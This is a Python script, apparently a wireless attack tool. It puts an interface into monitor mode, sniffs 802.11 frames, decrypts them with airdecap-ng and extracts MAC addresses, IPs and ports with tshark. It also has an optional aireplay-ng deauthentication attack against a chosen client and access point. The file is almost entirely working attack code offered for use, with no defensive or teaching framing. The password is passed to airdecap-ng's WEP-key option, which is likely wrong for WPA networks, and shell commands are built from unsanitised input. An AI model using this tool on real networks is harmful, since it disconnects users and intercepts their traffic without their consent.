import os
import sys
import time
from scapy.all import *

def set_monitor_mode(interface):
    print("[+] Enabling monitor mode...")
    os.system(f"sudo airmon-ng check kill")
    os.system(f"sudo airmon-ng start {interface}")
    return f"{interface}mon"

def restore_managed_mode(interface):
    print("[+] Restoring interface to managed mode...")
    os.system(f"sudo airmon-ng stop {interface}")
    os.system("sudo systemctl restart NetworkManager")

def sniff_packets(interface, output_file="captured.pcap"):
    print(f"[+] Sniffing on {interface}... Press Ctrl+C to stop.")
    packets = []
    try:
        def packet_handler(packet):
            if packet.haslayer(Dot11):
                print(packet.summary())
                packets.append(packet)
        
        sniff(iface=interface, prn=packet_handler, store=True)
    except KeyboardInterrupt:
        print("\n[+] Stopping packet capture...")
        wrpcap(output_file, packets)
        print(f"[+] Packets saved to {output_file}")

def strip_wireless_headers(input_file="captured.pcap", output_file="stripped.pcap"):
    wifi_password = input("[+] Enter the Wi-Fi password for decryption: ")
    print("[+] Stripping wireless headers using airdecap-ng...")
    os.system(f"sudo airdecap-ng -w {wifi_password} {input_file} -o {output_file}")
    print(f"[+] Stripped packets saved to {output_file}")

def extract_network_data(pcap_file="stripped.pcap", output_file="network_data.txt"):
    print("[+] Extracting MACs, IPs, and ports using tshark...")
    os.system(f"tshark -r {pcap_file} -T fields -e wlan.sa -e wlan.da -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport | sort | uniq > {output_file}")
    print(f"[+] Network data saved to {output_file}")

def deauth_attack(target_mac, gateway_mac, interface):
    print(f"[+] Launching Deauth attack on {target_mac} via {gateway_mac}")
    os.system(f"sudo aireplay-ng --deauth 50 -a {gateway_mac} -c {target_mac} {interface}")
    print("[+] Deauth attack complete")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: sudo python {sys.argv[0]} <interface> [deauth <target_mac> <gateway_mac>]")
        sys.exit(1)
    
    interface = sys.argv[1]
    monitor_interface = set_monitor_mode(interface)
    
    if len(sys.argv) == 5 and sys.argv[2] == "deauth":
        target_mac = sys.argv[3]
        gateway_mac = sys.argv[4]
        deauth_attack(target_mac, gateway_mac, monitor_interface)
    
    try:
        sniff_packets(monitor_interface)
        strip_wireless_headers()
        extract_network_data()
    finally:
        restore_managed_mode(monitor_interface)

if __name__ == "__main__":
    main()
